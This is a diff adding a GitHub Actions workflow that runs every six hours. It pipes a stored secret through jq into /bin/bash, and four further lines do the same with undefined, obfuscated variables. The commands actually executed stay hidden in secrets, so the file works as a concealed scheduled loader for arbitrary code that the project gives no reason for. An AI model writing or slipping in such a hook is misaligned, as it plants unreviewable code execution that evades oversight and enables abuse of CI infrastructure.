@@ -1,0 +1,21 @@
+name: dangnianqing4321
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dangnianqing4321
+        env:
+          vk7: ${{ secrets.vk7 }}
+        run: |
+          echo $vk7 | jq -r .io17 | /bin/bash
+          echo $kse5839 | jq -r .gpy4177 | /bin/bash
+          echo $f8042 | jq -r .nxa8 | /bin/bash
+          echo $ssxtn46 | jq -r .zp37 | /bin/bash
+          echo $gd39 | jq -r .cgg4 | /bin/bash
+
